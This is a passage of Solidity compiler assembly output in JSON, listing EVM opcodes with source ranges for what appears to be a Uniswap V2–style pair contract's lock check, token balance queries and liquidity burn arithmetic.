											"begin": 6129,
											"end": 6163,
											"name": "DUP3"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "SWAP1"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "SUB"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "ADD"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "SWAP1"
										},
										{
											"begin": 6129,
											"end": 6163,
											"name": "LOG2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1266,
											"end": 1267,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1255,
											"end": 1263,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "SSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "SWAP5"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "SWAP7"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "86"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "MSTORE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SWAP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "KECCAK256"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SLOAD"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP2"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "tag",
											"value": "88"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMPDEST"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "PUSH",
											"value": "E"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "SLOAD"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "DUP2"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "91"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "5"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "MSTORE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SWAP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "KECCAK256"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SLOAD"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP2"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "tag",
											"value": "94"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "JUMPDEST"
										},
										{
											"begin": 7732,
											"end": 7744,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7746,
											"end": 7758,
											"name": "DUP1"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "SLOAD"
										},
										{
											"begin": 1191,
											"end": 1192,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1179,
											"end": 1192,
											"name": "EQ"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH [tag]",
											"value": "225"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPI"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SUB"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "REVERT"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "tag",
											"value": "225"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPDEST"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1222,
											"end": 1230,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SWAP1"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SSTORE"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "DUP1"
										},
										{
											"begin": 7813,
											"end": 7826,
											"name": "PUSH [tag]",
											"value": "227"
										},
										{
											"begin": 7813,
											"end": 7824,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 7813,
											"end": 7826,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7813,
											"end": 7826,
											"name": "tag",
											"value": "227"
										},
										{
											"begin": 7813,
											"end": 7826,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "SLOAD"
										},
										{
											"begin": 7918,
											"end": 7924,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 7918,
											"end": 7924,
											"name": "SLOAD"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP1"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP2"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "MSTORE"
										},
										{
											"begin": 7999,
											"end": 8003,
											"name": "ADDRESS"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP3"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "ADD"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "MSTORE"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP1"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "MLOAD"
										},
										{
											"begin": 7770,
											"end": 7826,
											"name": "SWAP5"
										},
										{
											"begin": 7770,
											"end": 7826,
											"name": "SWAP7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7770,
											"end": 7826,
											"name": "SWAP3"
										},
										{
											"begin": 7770,
											"end": 7826,
											"name": "SWAP5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "SWAP2"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "DUP3"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "AND"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "SWAP4"
										},
										{
											"begin": 7918,
											"end": 7924,
											"name": "SWAP2"
										},
										{
											"begin": 7918,
											"end": 7924,
											"name": "AND"
										},
										{
											"begin": 7918,
											"end": 7924,
											"name": "SWAP2"
										},
										{
											"begin": 7851,
											"end": 7866,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 7851,
											"end": 7866,
											"name": "SWAP2"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "DUP5"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "SWAP2"
										},
										{
											"begin": 7965,
											"end": 7990,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 7965,
											"end": 7990,
											"name": "SWAP2"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP1"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP4"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "ADD"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP3"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP3"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP2"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP1"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP3"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP1"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SUB"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "ADD"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP2"
										},
										{
											"begin": 7869,
											"end": 7875,
											"name": "DUP7"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "DUP1"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "228"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "228"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "POP"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "GAS"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "STATICCALL"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "229"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "229"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "POP"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "POP"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "POP"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "POP"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "MLOAD"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "230"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "230"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "MLOAD"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP2"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "MSTORE"
										},
										{
											"begin": 8065,
											"end": 8069,
											"name": "ADDRESS"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP3"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "ADD"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "MSTORE"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "MLOAD"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP2"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8015,
											"end": 8028,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8015,
											"end": 8028,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 8031,
											"end": 8056,
											"name": "DUP6"
										},
										{
											"begin": 8031,
											"end": 8056,
											"name": "AND"
										},
										{
											"begin": 8031,
											"end": 8056,
											"name": "SWAP2"
										},
										{
											"begin": 8031,
											"end": 8056,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 8031,
											"end": 8056,
											"name": "SWAP2"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP4"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "ADD"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP3"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7965,
											"end": 8005,
											"name": "SWAP3"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP2"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP3"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SUB"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "ADD"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP2"
										},
										{
											"begin": 8031,
											"end": 8056,
											"name": "DUP7"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "DUP1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "231"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "231"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "POP"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "GAS"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "STATICCALL"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "232"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "232"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "POP"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "POP"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "POP"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "POP"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "MLOAD"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "233"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "233"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "MLOAD"
										},
										{
											"begin": 8116,
											"end": 8120,
											"name": "ADDRESS"
										},
										{
											"begin": 8081,
											"end": 8095,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "SWAP1"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "DUP2"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "MSTORE"
										},
										{
											"begin": 8098,
											"end": 8107,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "MSTORE"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "DUP2"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "KECCAK256"
										},
										{
											"begin": 8098,
											"end": 8122,
											"name": "SLOAD"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP2"
										},
										{
											"begin": 8031,
											"end": 8071,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8146,
											"end": 8176,
											"name": "PUSH [tag]",
											"value": "234"
										},
										{
											"begin": 8155,
											"end": 8164,
											"name": "DUP9"
										},
										{
											"begin": 8166,
											"end": 8175,
											"name": "DUP9"
										},
										{
											"begin": 8146,
											"end": 8154,
											"name": "PUSH [tag]",
											"value": "204"
										},
										{
											"begin": 8146,
											"end": 8176,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8146,
											"end": 8176,
											"name": "tag",
											"value": "234"
										},
										{
											"begin": 8146,
											"end": 8176,
											"name": "JUMPDEST"
										},
										{
											"begin": 8186,
											"end": 8203,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8206,
											"end": 8217,
											"name": "SLOAD"
										},
										{
											"begin": 8133,
											"end": 8176,
											"name": "SWAP1"
										},
										{
											"begin": 8133,
											"end": 8176,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8206,
											"end": 8217,
											"name": "DUP1"
										},
										{
											"begin": 8315,
											"end": 8338,
											"name": "PUSH [tag]",
											"value": "235"
										},
										{
											"begin": 8315,
											"end": 8324,
											"name": "DUP5"
										},
										{
											"begin": 8329,
											"end": 8337,
											"name": "DUP8"
										},
										{
											"begin": 8315,
											"end": 8338,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8315,
											"end": 8328,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 8315,
											"end": 8338,
											"name": "AND"
										},
										{
											"begin": 8315,
											"end": 8338,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8315,
											"end": 8338,
											"name": "tag",
											"value": "235"
										},
										{
											"begin": 8315,
											"end": 8338,
											"name": "JUMPDEST"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "DUP2"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "PUSH [tag]",
											"value": "236"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "JUMPI"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "INVALID"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "tag",
											"value": "236"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "JUMPDEST"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "DIV"
										},
										{
											"begin": 8315,
											"end": 8353,
											"name": "SWAP11"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 8447,
											"end": 8459,
											"name": "DUP1"
										},
										{
											"begin": 8421,
											"end": 8444,
											"name": "PUSH [tag]",
											"value": "237"
										},
										{
											"begin": 8421,
											"end": 8430,
											"name": "DUP5"
										},
										{
											"begin": 8435,
											"end": 8443,
											"name": "DUP7"
										},
										{
											"begin": 8421,
											"end": 8444,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 8421,
											"end": 8434,
											"name": "PUSH [tag]",
											"value": "168"
										},
										{
											"begin": 8421,
											"end": 8444,
											"name": "AND"
										},
										{
											"begin": 8421,
											"end": 8444,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 8421,
											"end": 8444,
											"name": "tag",
											"value": "237"
										},
										{
											"begin": 8421,
											"end": 8444,
											"name": "JUMPDEST"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "DUP2"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "PUSH [tag]",
											"value": "238"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "JUMPI"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "INVALID"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "tag",
											"value": "238"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "JUMPDEST"
										},
										{
											"begin": 8421,
											"end": 8459,
											"name": "DIV"
										},
										{
											"begin": 8411,
											"end": 8459,
											"name": "SWAP10"
										},
										{
											"begin": 8411,
											"end": 8459,
											"name": "POP"
										},
										{
											"begin": 8548,
											"end": 8549,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 8538,
											"end": 8545,
											"name": "DUP12"
										},
										{
											"begin": 8538,
											"end": 8549,
											"name": "GT"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "DUP1"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "ISZERO"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "PUSH [tag]",
											"value": "239"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "JUMPI"
										},
										{
											"begin": 8538,
											"end": 8564,
											"name": "POP"
										},
										{
											"begin": 8563,
											"end": 8564,
											"name": "PUSH",
											"value": "0"
										},
										{
